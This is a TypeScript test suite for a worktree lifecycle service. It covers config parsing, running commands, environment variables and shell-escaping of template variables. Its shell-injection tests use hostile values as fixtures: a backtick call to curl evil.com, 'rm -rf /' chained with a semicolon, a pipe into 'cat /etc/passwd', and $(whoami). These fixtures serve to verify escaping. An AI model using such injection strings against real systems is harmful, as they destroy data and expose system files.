import { describe, it, expect, vi, beforeEach } from "vitest";

/** Normalize a path to forward slashes for cross-platform mock matching */
const n = (p: string) => (p as string).replace(/\\/g, "/");

vi.mock("fs/promises", () => ({
  readFile: vi.fn(),
  access: vi.fn(),
  cp: vi.fn().mockResolvedValue(undefined),
}));

vi.mock("child_process", () => ({
  spawn: vi.fn(),
  spawnSync: vi.fn(),
}));

describe("WorktreeLifecycleService — Resource Config", () => {
  let service: import("../WorktreeLifecycleService.js").WorktreeLifecycleService;
  let mockAccess: ReturnType<typeof vi.fn>;
  let mockReadFile: ReturnType<typeof vi.fn>;
  let mockSpawn: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();

    const fsModule = await import("fs/promises");
    mockAccess = vi.mocked(fsModule.access);
    mockReadFile = vi.mocked(fsModule.readFile);

    const childProcessModule = await import("child_process");
    mockSpawn = vi.mocked(childProcessModule.spawn);

    const { WorktreeLifecycleService } = await import("../WorktreeLifecycleService.js");
    service = new WorktreeLifecycleService("/home/testuser");
  });

  function makeFakeProcess(exitCode: number = 0, errorEvent?: Error) {
    const stdout = { on: vi.fn() };
    const stderr = { on: vi.fn() };
    const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};

    const child = {
      pid: 12345,
      stdout,
      stderr,
      on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
        listeners[event] ??= [];
        listeners[event].push(cb);
      }),
      kill: vi.fn(),
      emit: (event: string, ...args: unknown[]) => {
        listeners[event]?.forEach((cb) => cb(...args));
      },
    };

    setTimeout(() => {
      if (errorEvent) {
        child.emit("error", errorEvent);
      } else {
        child.emit("close", exitCode);
      }
    }, 0);

    return child;
  }

  describe("loadConfig with resource block", () => {
    it("parses a full resource config with all fields", async () => {
      const config = {
        setup: ["npm install"],
        resource: {
          provision: ["docker compose up -d"],
          teardown: ["docker compose down"],
          resume: ["docker compose start"],
          pause: ["docker compose stop"],
          status: "docker compose ps --format json",
          connect: "docker exec -it app bash",
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.setup).toEqual(["npm install"]);
      expect(result?.resource).toBeDefined();
      expect(result?.resource?.provision).toEqual(["docker compose up -d"]);
      expect(result?.resource?.teardown).toEqual(["docker compose down"]);
      expect(result?.resource?.resume).toEqual(["docker compose start"]);
      expect(result?.resource?.pause).toEqual(["docker compose stop"]);
      expect(result?.resource?.status).toBe("docker compose ps --format json");
      expect(result?.resource?.connect).toBe("docker exec -it app bash");
    });

    it("parses resource config with only status field", async () => {
      const config = {
        resource: {
          status: "curl http://localhost:8080/health",
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.setup).toBeUndefined();
      expect(result?.resource?.status).toBe("curl http://localhost:8080/health");
      expect(result?.resource?.provision).toBeUndefined();
      expect(result?.resource?.teardown).toBeUndefined();
      expect(result?.resource?.resume).toBeUndefined();
      expect(result?.resource?.pause).toBeUndefined();
      expect(result?.resource?.connect).toBeUndefined();
    });

    it("parses an empty resource block as valid", async () => {
      const config = { resource: {} };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.resource).toEqual({});
    });

    it("backward compatibility: config without resource field still works", async () => {
      const config = { setup: ["npm install"] };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual({ setup: ["npm install"] });
      expect(result?.resource).toBeUndefined();
    });

    it("rejects config where resource.status is an array instead of string", async () => {
      const invalidConfig = { resource: { status: ["invalid"] } };
      const validConfig = { setup: ["npm install"] };

      let readCount = 0;
      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockImplementation(async () => {
        readCount++;
        if (readCount === 1) return JSON.stringify(invalidConfig);
        return JSON.stringify(validConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(validConfig);
    });

    it("rejects config where resource.provision contains non-strings", async () => {
      const invalidConfig = { resource: { provision: [123, true] } };
      const validConfig = { setup: ["yarn install"] };

      let readCount = 0;
      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockImplementation(async () => {
        readCount++;
        if (readCount === 1) return JSON.stringify(invalidConfig);
        return JSON.stringify(validConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(validConfig);
    });

    it("rejects config where resource.connect is a number", async () => {
      const invalidConfig = { resource: { connect: 42 } };
      const validConfig = { teardown: ["docker compose down"] };

      let readCount = 0;
      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockImplementation(async () => {
        readCount++;
        if (readCount === 1) return JSON.stringify(invalidConfig);
        return JSON.stringify(validConfig);
      });

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).toEqual(validConfig);
    });

    it("parses resource config with only array fields (provision, teardown, start, stop)", async () => {
      const config = {
        resource: {
          provision: ["terraform init", "terraform apply -auto-approve"],
          teardown: ["terraform destroy -auto-approve"],
          resume: ["systemctl start myservice"],
          pause: ["systemctl stop myservice"],
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.resource?.provision).toEqual([
        "terraform init",
        "terraform apply -auto-approve",
      ]);
      expect(result?.resource?.teardown).toEqual(["terraform destroy -auto-approve"]);
      expect(result?.resource?.resume).toEqual(["systemctl start myservice"]);
      expect(result?.resource?.pause).toEqual(["systemctl stop myservice"]);
    });

    it("config with both setup/teardown and resource block coexist", async () => {
      const config = {
        setup: ["npm install"],
        teardown: ["rm -rf node_modules"],
        resource: {
          provision: ["docker compose up -d"],
          teardown: ["docker compose down"],
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.setup).toEqual(["npm install"]);
      expect(result?.teardown).toEqual(["rm -rf node_modules"]);
      expect(result?.resource?.provision).toEqual(["docker compose up -d"]);
      expect(result?.resource?.teardown).toEqual(["docker compose down"]);
    });

    it("user-level config with resource block takes priority", async () => {
      const userConfig = {
        resource: {
          provision: ["docker compose -f docker-compose.dev.yml up -d"],
        },
      };
      mockAccess.mockResolvedValue(undefined);
      mockReadFile.mockResolvedValue(JSON.stringify(userConfig));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.resource?.provision).toEqual([
        "docker compose -f docker-compose.dev.yml up -d",
      ]);
    });
  });

  describe("runCommands for resource operations", () => {
    it("runs a single status-like command successfully", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(0));

      const onProgress = vi.fn();
      const result = await service.runCommands(["docker compose ps --format json"], {
        cwd: "/project",
        env: {},
        onProgress,
      });

      expect(result.success).toBe(true);
      expect(onProgress).toHaveBeenCalledWith(0, 1, "docker compose ps --format json");
    });

    it("runs multiple provision commands sequentially", async () => {
      const callOrder: string[] = [];
      mockSpawn.mockImplementation((cmd: string) => {
        callOrder.push(cmd);
        return makeFakeProcess(0);
      });

      const result = await service.runCommands(
        ["docker compose pull", "docker compose up -d", "docker compose exec app migrate"],
        {
          cwd: "/project",
          env: {},
          onProgress: vi.fn(),
        }
      );

      expect(result.success).toBe(true);
      expect(callOrder).toEqual([
        "docker compose pull",
        "docker compose up -d",
        "docker compose exec app migrate",
      ]);
    });

    it("stops at first failing provision command", async () => {
      let callCount = 0;
      mockSpawn.mockImplementation(() => {
        callCount++;
        return makeFakeProcess(callCount === 2 ? 1 : 0);
      });

      const result = await service.runCommands(
        ["docker compose pull", "docker compose up -d", "docker compose exec app migrate"],
        {
          cwd: "/project",
          env: {},
          onProgress: vi.fn(),
        }
      );

      expect(result.success).toBe(false);
      expect(callCount).toBe(2);
      expect(result.error).toContain("docker compose up -d");
    });

    it("runs teardown commands and reports failure on non-zero exit", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(1));

      const result = await service.runCommands(["docker compose down --volumes"], {
        cwd: "/project",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain("exit");
    });

    it("handles spawn error for resource commands", async () => {
      mockSpawn.mockReturnValue(makeFakeProcess(0, new Error("ENOENT: docker not found")));

      const result = await service.runCommands(["docker compose up -d"], {
        cwd: "/project",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain("ENOENT");
    });

    it("respects custom timeout for long-running provision commands", async () => {
      vi.useFakeTimers();

      const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
      const child = {
        pid: 12345,
        stdout: { on: vi.fn() },
        stderr: { on: vi.fn() },
        on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
          listeners[event] ??= [];
          listeners[event].push(cb);
        }),
        kill: vi.fn(),
      };
      mockSpawn.mockReturnValue(child);

      const resultPromise = service.runCommands(["terraform apply -auto-approve"], {
        cwd: "/project",
        env: {},
        timeoutMs: 300_000,
        onProgress: vi.fn(),
      });

      vi.advanceTimersByTime(300_001);

      listeners["close"]?.forEach((cb) => cb(null));
      const result = await resultPromise;
      expect(result.timedOut).toBe(true);
      expect(result.success).toBe(false);

      vi.useRealTimers();
    });

    it("reports progress correctly for resource command sequences", async () => {
      mockSpawn.mockImplementation(() => makeFakeProcess(0));

      const onProgress = vi.fn();
      await service.runCommands(["docker compose pull", "docker compose up -d"], {
        cwd: "/project",
        env: {},
        onProgress,
      });

      expect(onProgress).toHaveBeenCalledTimes(2);
      expect(onProgress).toHaveBeenCalledWith(0, 2, "docker compose pull");
      expect(onProgress).toHaveBeenCalledWith(1, 2, "docker compose up -d");
    });

    it("returns success for empty provision array", async () => {
      const result = await service.runCommands([], {
        cwd: "/project",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(true);
      expect(mockSpawn).not.toHaveBeenCalled();
    });
  });

  describe("loadConfig with resources (plural) block", () => {
    it("parses resources record with multiple named environments", async () => {
      const config = {
        resources: {
          docker: {
            provision: ["docker compose up -d"],
            connect: "docker exec -it app bash",
          },
          akash: {
            provision: ["akash deploy"],
            status: "akash status",
          },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result).not.toBeNull();
      expect(result?.resources?.docker?.provision).toEqual(["docker compose up -d"]);
      expect(result?.resources?.akash?.status).toBe("akash status");
    });

    it("backward compat: singular resource still works alongside resources", async () => {
      const config = {
        resource: {
          provision: ["old-provision"],
        },
        resources: {
          docker: {
            provision: ["docker compose up -d"],
          },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.resource?.provision).toEqual(["old-provision"]);
      expect(result?.resources?.docker?.provision).toEqual(["docker compose up -d"]);
    });

    it("config with only resources (no singular resource) parses correctly", async () => {
      const config = {
        resources: {
          fly: {
            provision: ["fly deploy"],
            teardown: ["fly destroy"],
          },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.resource).toBeUndefined();
      expect(result?.resources?.fly?.provision).toEqual(["fly deploy"]);
    });

    it("allows empty environments in resources record", async () => {
      const config = {
        resources: {
          staging: {},
          prod: { provision: ["deploy-prod"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadConfig("/path/to/worktree", "/path/to/project");
      expect(result?.resources?.staging).toEqual({});
      expect(result?.resources?.prod?.provision).toEqual(["deploy-prod"]);
    });
  });

  describe("loadResourceConfig resolution", () => {
    it("returns named environment when environmentId provided", async () => {
      const config = {
        resources: {
          docker: { provision: ["docker up"] },
          akash: { provision: ["akash deploy"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig(
        "/path/to/worktree",
        "/path/to/project",
        "akash"
      );
      expect(result?.provision).toEqual(["akash deploy"]);
    });

    it("returns default environment when no environmentId", async () => {
      const config = {
        resources: {
          default: { provision: ["default-provision"] },
          staging: { provision: ["staging-provision"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result?.provision).toEqual(["default-provision"]);
    });

    it("falls back to singular resource when resources not present", async () => {
      const config = {
        resource: { provision: ["old-way"] },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result?.provision).toEqual(["old-way"]);
    });

    it("returns null when neither resource nor resources exist", async () => {
      const config = { setup: ["npm install"] };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result).toBeNull();
    });

    it("falls back to first entry when no default and no environmentId", async () => {
      const config = {
        resources: {
          staging: { provision: ["staging-deploy"] },
          prod: { provision: ["prod-deploy"] },
        },
      };

      mockAccess.mockImplementation(async (p: string) => {
        if (n(p).includes("/.canopy/projects/")) throw new Error("ENOENT");
        if (n(p).endsWith("/worktree/.canopy/config.json")) throw new Error("ENOENT");
        return undefined;
      });

      mockReadFile.mockResolvedValue(JSON.stringify(config));

      const result = await service.loadResourceConfig("/path/to/worktree", "/path/to/project");
      expect(result?.provision).toEqual(["staging-deploy"]);
    });
  });

  describe("buildEnv (regression check)", () => {
    it("returns standard CANOPY_* and non-interactive env vars", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/resource-lifecycle");
      expect(env).toEqual({
        CI: "true",
        NONINTERACTIVE: "1",
        GIT_TERMINAL_PROMPT: "0",
        DEBIAN_FRONTEND: "noninteractive",
        CANOPY_WORKTREE_PATH: "/worktrees/feat",
        CANOPY_PROJECT_ROOT: "/project",
        CANOPY_WORKTREE_NAME: "feature/resource-lifecycle",
      });
    });

    it("includes CANOPY_BRANCH when branch is provided", () => {
      const env = service.buildEnv(
        "/worktrees/feat",
        "/project",
        "feature/lifecycle",
        "feature/lifecycle"
      );
      expect(env.CANOPY_BRANCH).toBe("feature/lifecycle");
    });

    it("omits CANOPY_BRANCH when branch is undefined", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle");
      expect(env).not.toHaveProperty("CANOPY_BRANCH");
    });

    it("includes CANOPY_RESOURCE_PROVIDER when resource provider is provided", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        provider: "akash",
      });
      expect(env.CANOPY_RESOURCE_PROVIDER).toBe("akash");
    });

    it("includes CANOPY_RESOURCE_ENDPOINT when resource endpoint is provided", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        endpoint: "https://app.example.com",
      });
      expect(env.CANOPY_RESOURCE_ENDPOINT).toBe("https://app.example.com");
    });

    it("includes CANOPY_RESOURCE_STATUS when resource lastOutput is provided", () => {
      const jsonOutput = '{"status":"ready","endpoint":"10.0.0.1"}';
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        lastOutput: jsonOutput,
      });
      expect(env.CANOPY_RESOURCE_STATUS).toBe(jsonOutput);
    });

    it("includes all three resource vars when all provided", () => {
      const jsonOutput = '{"status":"ready"}';
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        provider: "fly",
        endpoint: "https://fly.example.com",
        lastOutput: jsonOutput,
      });
      expect(env.CANOPY_RESOURCE_PROVIDER).toBe("fly");
      expect(env.CANOPY_RESOURCE_ENDPOINT).toBe("https://fly.example.com");
      expect(env.CANOPY_RESOURCE_STATUS).toBe(jsonOutput);
    });

    it("omits resource vars when resource parameter is undefined", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle");
      expect(env).not.toHaveProperty("CANOPY_RESOURCE_PROVIDER");
      expect(env).not.toHaveProperty("CANOPY_RESOURCE_ENDPOINT");
      expect(env).not.toHaveProperty("CANOPY_RESOURCE_STATUS");
    });

    it("omits individual resource vars when their values are undefined", () => {
      const env = service.buildEnv("/worktrees/feat", "/project", "feature/lifecycle", undefined, {
        provider: "fly",
      });
      expect(env.CANOPY_RESOURCE_PROVIDER).toBe("fly");
      expect(env).not.toHaveProperty("CANOPY_RESOURCE_ENDPOINT");
      expect(env).not.toHaveProperty("CANOPY_RESOURCE_STATUS");
    });
  });

  describe("substituteVariables", () => {
    const origPlatform = process.platform;
    afterEach(() => {
      Object.defineProperty(process, "platform", { value: origPlatform });
    });

    function setPlatform(p: string) {
      Object.defineProperty(process, "platform", { value: p });
    }

    const baseVars = { worktree_path: "/w", worktree_name: "test", project_root: "/p" };

    it("shell-escapes {{branch}} on Unix (single quotes)", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
        ...baseVars,
        branch: "feature/test",
      });
      expect(result).toBe("ssh deploy@'feature/test'.example.com");
    });

    it("shell-escapes {{branch}} on Windows (double quotes)", () => {
      setPlatform("win32");
      const result = service.substituteVariables("ssh deploy@{{branch}}.example.com", {
        ...baseVars,
        branch: "feature/test",
      });
      expect(result).toBe('ssh deploy@"feature/test".example.com');
    });

    it("shell-escapes {{worktree_path}} and {{project_root}}", () => {
      setPlatform("linux");
      const result = service.substituteVariables(
        "rsync {{worktree_path}}/ remote:{{project_root}}/",
        {
          ...baseVars,
          branch: "main",
          worktree_path: "/home/user/worktree",
          project_root: "/home/user/project",
        }
      );
      expect(result).toBe("rsync '/home/user/worktree'/ remote:'/home/user/project'/");
    });

    it("shell-escapes {{worktree_name}} placeholder", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("docker exec -it {{worktree_name}} bash", {
        ...baseVars,
        branch: "feat/x",
        worktree_name: "feat-x",
      });
      expect(result).toBe("docker exec -it 'feat-x' bash");
    });

    it("shell-escapes {{endpoint}} when provided", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("ssh root@{{endpoint}}", {
        ...baseVars,
        endpoint: "10.0.0.42",
      });
      expect(result).toBe("ssh root@'10.0.0.42'");
    });

    it("leaves unresolved variables as-is (fails loudly in shell)", () => {
      const result = service.substituteVariables("ssh root@{{unknown_var}}", baseVars);
      expect(result).toBe("ssh root@{{unknown_var}}");
    });

    it("replaces multiple variables with escaping", () => {
      setPlatform("linux");
      const result = service.substituteVariables(
        "deploy --branch={{branch}} --dir={{worktree_path}} --name={{worktree_name}}",
        { ...baseVars, branch: "main", worktree_path: "/w/main", worktree_name: "main" }
      );
      expect(result).toBe("deploy --branch='main' --dir='/w/main' --name='main'");
    });

    it("is case-insensitive for variable names", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("echo {{BRANCH}} {{Worktree_Path}}", {
        ...baseVars,
        branch: "dev",
      });
      expect(result).toBe("echo 'dev' '/w'");
    });

    it("handles command with no placeholders", () => {
      const result = service.substituteVariables("docker compose up -d", {
        ...baseVars,
        branch: "main",
      });
      expect(result).toBe("docker compose up -d");
    });

    it("leaves {branch-slug} unquoted (already sanitized to [a-z0-9-])", () => {
      setPlatform("darwin");
      const result = service.substituteVariables("deploy {branch-slug}", {
        ...baseVars,
        branch: "feature/test",
        "branch-slug": "feature-test",
      });
      expect(result).toBe("deploy feature-test");
    });

    describe("shell injection prevention", () => {
      it("neutralizes $(command) in branch names on Unix", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: "feat/$(whoami)",
        });
        expect(result).toBe("echo 'feat/$(whoami)'");
      });

      it("neutralizes backtick injection on Unix", () => {
        setPlatform("linux");
        const result = service.substituteVariables("ssh root@{{endpoint}}", {
          ...baseVars,
          endpoint: "host`curl evil.com`",
        });
        expect(result).toBe("ssh root@'host`curl evil.com`'");
      });

      it("escapes embedded single quotes on Unix", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: "it's-a-branch",
        });
        expect(result).toBe("echo 'it'\\''s-a-branch'");
      });

      it("escapes embedded double quotes on Windows", () => {
        setPlatform("win32");
        const result = service.substituteVariables("echo {{branch}}", {
          ...baseVars,
          branch: 'say "hi"',
        });
        expect(result).toBe('echo "say ""hi"""');
      });

      it("neutralizes semicolon command chaining", () => {
        setPlatform("linux");
        const result = service.substituteVariables("deploy {{branch}}", {
          ...baseVars,
          branch: "main; rm -rf /",
        });
        expect(result).toBe("deploy 'main; rm -rf /'");
      });

      it("neutralizes pipe injection in endpoint", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("curl {{endpoint}}", {
          ...baseVars,
          endpoint: "http://ok | cat /etc/passwd",
        });
        expect(result).toBe("curl 'http://ok | cat /etc/passwd'");
      });

      it("escapes Windows %VAR% environment variable expansion", () => {
        setPlatform("win32");
        const result = service.substituteVariables("deploy {{branch}}", {
          ...baseVars,
          branch: "feat/%CD%",
        });
        expect(result).toBe('deploy "feat/%%CD%%"');
      });

      it("falls back to escaping branch-slug if it contains unexpected characters", () => {
        setPlatform("darwin");
        const result = service.substituteVariables("deploy {branch-slug}", {
          ...baseVars,
          "branch-slug": "bad; rm -rf /",
        });
        expect(result).toBe("deploy 'bad; rm -rf /'");
      });
    });
  });

  describe("buildVariables", () => {
    it("returns all lifecycle variables", () => {
      const vars = service.buildVariables("/w/feat", "/project", "feat-branch", "feature/test");
      expect(vars).toEqual({
        branch: "feature/test",
        worktree_path: "/w/feat",
        worktree_name: "feat-branch",
        project_root: "/project",
        endpoint: undefined,
        "parent-dir": "/",
        "base-folder": "project",
        "branch-slug": "feature-test",
        "repo-name": "project",
      });
    });

    it("sets branch to undefined when not provided", () => {
      const vars = service.buildVariables("/w/detached", "/project", "detached");
      expect(vars.branch).toBeUndefined();
    });

    it("includes endpoint when provided", () => {
      const vars = service.buildVariables("/w", "/p", "test", "main", "https://app.example.com");
      expect(vars).toEqual({
        branch: "main",
        worktree_path: "/w",
        worktree_name: "test",
        project_root: "/p",
        endpoint: "https://app.example.com",
        "parent-dir": "/",
        "base-folder": "p",
        "branch-slug": "main",
        "repo-name": "p",
      });
    });

    it("omits endpoint when not provided", () => {
      const vars = service.buildVariables("/w/detached", "/project", "detached");
      expect(vars.endpoint).toBeUndefined();
    });
  });
});
